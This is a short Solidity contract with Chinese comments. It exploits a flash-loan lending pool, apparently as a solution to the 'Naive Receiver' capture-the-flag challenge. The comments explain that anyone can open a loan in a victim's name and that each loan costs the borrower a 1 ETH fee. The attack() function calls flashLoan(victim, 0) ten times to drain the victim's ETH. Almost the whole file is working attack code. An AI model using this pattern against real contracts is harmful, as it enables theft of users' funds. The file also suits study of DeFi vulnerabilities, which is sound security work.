// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanPool {
    function flashLoan(address payable borrower, uint256 borrowAmount) external;
    function fixedFee() external pure returns (uint256);
}

/**
 * @title NaiveReceiverAttack
 * @notice 利用 NaiveReceiverLenderPool 耗尽受害者的 ETH
 * 
 * 漏洞：任何人都能以任意地址为借款人调用 flashLoan()，
 *       每次操作借款人需支付 1 ETH 手续费。
 * 攻击：循环调用 flashLoan(受害者, 0)，每次消耗受害者 1 ETH
 */
contract NaiveReceiverAttack {
    
    IFlashLoanPool pool;
    address attacker;
    
    constructor(address _pool) public {
        pool = IFlashLoanPool(_pool);
        attacker = msg.sender;
    }
    
    function attack(address payable victim) external {
        // 调用 10 次 flashLoan，每次消耗受害者 1 ETH
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0);
        }
    }
}
